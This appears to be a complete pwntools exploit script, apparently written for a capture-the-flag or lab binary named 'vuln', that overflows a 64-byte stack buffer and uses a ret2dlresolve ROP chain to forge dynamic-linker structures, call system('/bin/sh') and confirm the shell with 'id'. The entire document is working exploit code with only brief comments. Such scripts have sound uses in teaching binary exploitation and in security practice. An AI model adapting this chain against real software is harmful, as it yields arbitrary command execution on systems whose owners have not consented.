#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')          # -no-pie, partial RELRO, lazy
OFFSET = 72                                    # 64-byte buf + saved rbp

# pwntools forges the fake Elf64_Rela + Elf64_Sym + "system"/"/bin/sh"
# and picks a writable staging address in .bss for us.
dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])   # 1

rop = ROP(elf)
rop.read(0, dl.data_addr, len(dl.payload))     # 2  read forged blob into .bss
rop.ret2dlresolve(dl)                          # 3  call PLT[0] with fake index
log.info(rop.dump())

payload = flat({OFFSET: rop.chain()})

io = process(elf.path)
io.sendline(payload)                           # stage 1: the ROP chain
io.sendline(dl.payload)                         # 4  stage 2: the forged structures
io.sendline(b'echo DLR_OK; id')
io.recvuntil(b'DLR_OK')
log.success('shell: %s', io.recvline().strip().decode())
io.close()
